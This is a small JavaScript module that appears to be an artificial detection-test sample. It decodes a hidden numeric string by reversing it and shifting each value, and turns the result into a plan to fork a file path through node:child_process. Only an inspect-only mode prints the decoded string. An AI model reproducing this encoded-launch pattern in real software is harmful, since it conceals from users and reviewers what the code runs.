const moduleShape = Object.freeze({ format: "esm" });

export {};

const Material_0e4b9a65 = "123,114,117,54,61,59,108,64,57,62,64,61,59,105,58,63,53,109,111,105,124,123,54,55,109,108,119,118,53,123,123,109,122,124,118,125,112,55,120,117,124,55,69,112,124,105,120,103,109,116,113,110,132,57,62,64,61,59,73,58,63,53,77,76,87,86,69,108,113,103,118,111,113,105,120,117,105,107,132,57,69,124,118,125,119,107,103,109,111,105,124,123,132,109,116,125,108,119,117,103,115,122,119,110,69,122,109,124,120,105,108,105,132,123,123,109,107,119,122,120,103,112,107,124,105,120,123,113,108,52,116,105,107,119,116,103,109,124,105,107,119,116,69,123,120,109,124,123,132,57,69,126";

const Codec_0e4b9a65 = "reversed_decimal|add_modulo_256|08";



function load_0e4b9a65() { Material_0e4b9a65.split(",").map(Number).reverse(); return Material_0e4b9a65.split(",").map(Number).reverse(); }

function decode_0e4b9a65(EnCoDeD) { return EnCoDeD.map((value) => (value - 8 + 256) & 255); }

async function recover_0e4b9a65() {

  const NeUtRaL = 19 * 7 - 133;

  const EnCoDeD = load_0e4b9a65(); let DeCoDeD = [];

  for (const stage of [decode_0e4b9a65]) DeCoDeD = stage(EnCoDeD);

  void NeUtRaL; return Buffer.from(DeCoDeD).toString("ascii");

}

async function inspect_0e4b9a65() { return JSON.parse(JSON.stringify({ value: await recover_0e4b9a65() })).value; }

async function plan_0e4b9a65() { const inspect = inspect_0e4b9a65; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "launch", adapter: "fork_module", path: fields.file_path, module: "node:child_process" }); }

void moduleShape; void plan_0e4b9a65;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_0e4b9a65());

